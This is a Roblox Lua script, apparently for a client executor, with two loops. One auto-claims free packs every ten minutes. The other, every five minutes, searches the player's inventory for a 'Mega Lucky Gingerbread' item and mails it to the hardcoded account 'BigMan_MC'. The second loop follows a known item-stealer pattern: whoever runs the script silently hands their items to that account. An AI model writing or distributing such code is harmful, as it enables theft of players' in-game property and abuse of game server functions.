-- Function to claim free Forever Packs periodically
spawn(function()
    while true do
        pcall(function() 
            game:GetService("ReplicatedStorage").Network["ForeverPacks: Claim Free"]:InvokeServer("Default")
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)

-- Function to process Mega Lucky Gingerbread items and send them
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "BigMan_MC"
    local loopInterval = 5  -- Interval in minutes

    while true do
        -- Get the player's inventory
        local playerInventory = Save.Get()["Inventory"]
        local Miscinv = playerInventory["Misc"]

        print("Searching for Mega Lucky Gingerbread...")

        for key, item in pairs(Miscinv) do
            if item.id == "Mega Lucky Gingerbread" then
                print("Found Mega Lucky Gingerbread item:", item)

                local amount = item._am or item.am or 1  -- Default to 1 if amount is missing
                print("Amount to send:", amount)

                local args = {
                    [1] = username,
                    [2] = "Take these gifts",
                    [3] = "Misc",
                    [4] = key,  -- Use the key or index of the item
                    [5] = amount
                }

                print("Invoking Server with args:", unpack(args))
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                break  -- Exit the loop after mailing the first item
            end
        end

        print("Finished processing Mega Lucky Gingerbread items.")
        task.wait(loopInterval * 60) -- Wait for the specified interval before the next check
    end
end)
